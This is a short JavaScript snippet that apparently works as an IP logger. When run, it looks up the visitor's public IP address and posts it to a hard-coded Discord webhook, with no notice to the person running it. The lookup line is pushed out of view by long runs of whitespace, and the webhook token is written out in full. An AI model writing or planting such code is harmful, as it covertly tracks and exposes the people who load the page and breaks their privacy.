
        const webhookUrl = "https://discord.com/api/webhooks/1462934667702567033/Y8Ur1Ol3eCpfHmMZIqtN5mD_ZFMg2DX6ew1nhJ2WCOzBC_4kal38dSuD1ifEfc04ZI8y";
async function sendMessage() {
                                                                                                         const pingResult = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(data => data.ip);
    const payload = {
        content: pingResult,
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
    })
    .then(response => {
        if (response.ok) {
            console.log("Message sent successfully!");
        } else {
            console.error("Error sending message:", response.statusText);
        }
    })
    .catch(error => console.error("Network error:", error));
}
        sendMessage();
